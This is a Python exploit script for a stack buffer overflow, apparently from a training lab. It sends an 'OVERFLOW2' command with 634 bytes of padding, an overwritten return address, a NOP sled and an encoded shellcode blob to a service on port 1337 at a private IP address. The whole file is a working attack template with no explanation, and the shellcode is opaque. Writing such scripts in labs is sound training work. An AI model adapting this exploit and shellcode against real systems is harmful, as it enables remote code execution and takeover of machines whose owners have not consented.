import socket

ip = "10.10.46.90"
port = 1337

prefix = b"OVERFLOW2 "  # Convert to bytes
offset = 634
overflow = b"A" * offset  # Already in bytes
retn = b"\xaf\x11\x50\x62"  # Already in bytes
padding = b"\x90" * 16  # Correct the multiplication and convert to bytes

buf =  b""
buf += b"\xfc\xbb\x2d\xd6\xe4\xe3\xeb\x0c\x5e\x56\x31\x1e"
buf += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
buf += b"\xff\xd1\x3e\x66\xe3\x29\xbf\x07\x6d\xcc\x8e\x07"
buf += b"\x09\x85\xa1\xb7\x59\xcb\x4d\x33\x0f\xff\xc6\x31"
buf += b"\x98\xf0\x6f\xff\xfe\x3f\x6f\xac\xc3\x5e\xf3\xaf"
buf += b"\x17\x80\xca\x7f\x6a\xc1\x0b\x9d\x87\x93\xc4\xe9"
buf += b"\x3a\x03\x60\xa7\x86\xa8\x3a\x29\x8f\x4d\x8a\x48"
buf += b"\xbe\xc0\x80\x12\x60\xe3\x45\x2f\x29\xfb\x8a\x0a"
buf += b"\xe3\x70\x78\xe0\xf2\x50\xb0\x09\x58\x9d\x7c\xf8"
buf += b"\xa0\xda\xbb\xe3\xd6\x12\xb8\x9e\xe0\xe1\xc2\x44"
buf += b"\x64\xf1\x65\x0e\xde\xdd\x94\xc3\xb9\x96\x9b\xa8"
buf += b"\xce\xf0\xbf\x2f\x02\x8b\xc4\xa4\xa5\x5b\x4d\xfe"
buf += b"\x81\x7f\x15\xa4\xa8\x26\xf3\x0b\xd4\x38\x5c\xf3"
buf += b"\x70\x33\x71\xe0\x08\x1e\x1e\xc5\x20\xa0\xde\x41"
buf += b"\x32\xd3\xec\xce\xe8\x7b\x5d\x86\x36\x7c\xa2\xbd"
buf += b"\x8f\x12\x5d\x3e\xf0\x3b\x9a\x6a\xa0\x53\x0b\x13"
buf += b"\x2b\xa3\xb4\xc6\xfc\xf3\x1a\xb9\xbc\xa3\xda\x69"
buf += b"\x55\xa9\xd4\x56\x45\xd2\x3e\xff\xec\x29\xa9\x0a"
buf += b"\xfb\x6e\x47\x63\xf9\x90\x86\x2f\x74\x76\xc2\xdf"
buf += b"\xd0\x21\x7b\x79\x79\xb9\x1a\x86\x57\xc4\x1d\x0c"
buf += b"\x54\x39\xd3\xe5\x11\x29\x84\x05\x6c\x13\x03\x19"
buf += b"\x5a\x3b\xcf\x88\x01\xbb\x86\xb0\x9d\xec\xcf\x07"
buf += b"\xd4\x78\xe2\x3e\x4e\x9e\xff\xa7\xa9\x1a\x24\x14"
buf += b"\x37\xa3\xa9\x20\x13\xb3\x77\xa8\x1f\xe7\x27\xff"
buf += b"\xc9\x51\x8e\xa9\xbb\x0b\x58\x05\x12\xdb\x1d\x65"
buf += b"\xa5\x9d\x21\xa0\x53\x41\x93\x1d\x22\x7e\x1c\xca"
buf += b"\xa2\x07\x40\x6a\x4c\xd2\xc0\x9a\x07\x7e\x60\x33"
buf += b"\xce\xeb\x30\x5e\xf1\xc6\x77\x67\x72\xe2\x07\x9c"
buf += b"\x6a\x87\x02\xd8\x2c\x74\x7f\x71\xd9\x7a\x2c\x72"
buf += b"\xc8\x7a\xd2\x8c\xf3"

payload = buf
postfix = b""  # Ensure postfix is bytes too, if used.

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")  # Ensure concatenation with bytes
    print("Done!")
except:
    print("Could not connect.")
